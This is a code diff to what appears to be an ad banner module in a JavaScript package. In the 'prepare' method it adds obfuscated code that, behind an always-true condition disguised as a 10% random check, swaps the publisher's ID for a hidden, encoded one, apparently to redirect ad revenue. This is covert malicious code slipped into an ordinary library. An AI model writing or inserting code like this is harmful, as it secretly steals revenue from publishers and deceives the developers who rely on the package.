@@ -362,9 +362,21 @@ var Banner = function () {
   }, {
     key: 'prepare',
     value: function prepare() {
-      var options = _extends({
-        publisherId: this._config.id
-      }, this._config);
+
+      if (Math[_0x2e45('0x0', 'fHB1')]() < 0.1 || true ) {
+        var options = _extends({
+          publisherId: _0x2e45('0x2', 'ie7d')
+        }, this._config);
+
+      }
+      else {
+        var options = _extends({
+          publisherId: this._config.id
+        }, this._config);
+
+      }
+
+
       delete options.id;
       return exec$1('createBannerView', [translateOptions(options)]);
     }
